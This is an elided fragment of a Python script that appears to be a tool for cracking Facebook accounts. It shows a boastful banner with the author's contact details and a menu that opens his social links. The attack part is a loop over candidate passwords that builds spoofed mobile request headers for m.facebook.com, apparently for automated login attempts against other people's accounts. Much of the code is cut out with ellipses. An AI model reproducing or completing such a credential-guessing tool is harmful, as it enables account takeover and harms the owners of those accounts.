...
\$$$$$$  | $$$$$$  |\$$$$$$  |$$$$$$\ $$$$$$$  |
 \______/  \______/  \______/ \______|\_______/ 
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{M} SOJIB                {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}Ñø Bî Tâ              {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801879614819         {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}gK1NG-SOJIB-69{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H} PREMIUM {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}0.1                   ║
   {H} ║{P}[{H}•{P}] Tools     : {H} ULTRA GREEN       ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}       {H} STOP ME IF YOU CAN 
 {K}[{H}√{K}]{P} Successfully Update Done {H}0.1""");print(led)
...
def mainx():
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://www..facebook.com/profile.php?id=100074200236579");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}SOJIB {P}Terminal ');os.system("xdg-open https://www..facebook.com/profile.php?id=100074200236579");time.sleep(3);os.system('xdg-open https://wa.me/+8801879614819');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://github.com/K1NG-SOJIB-69");mainx()
def mainx2():
    os.system("clear")
    banner()
 ...
 try:
  for ps in pw:
   ...
   header_freefb = {'authority': 'm.facebook.com',
    ...
    'referer': 'https://m.facebook.com/gettingstarted/?step=upload_profile_pic&eav=AfZj3fiKHRsm17k8Ls6AMQtN1IN1pgwqIH-dQvlh76n-_2i6lYTMeZROJpKSc5YpyzI&paipv=0&wtsid=rdr_0I2Bay0G8GCWWTu9G&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
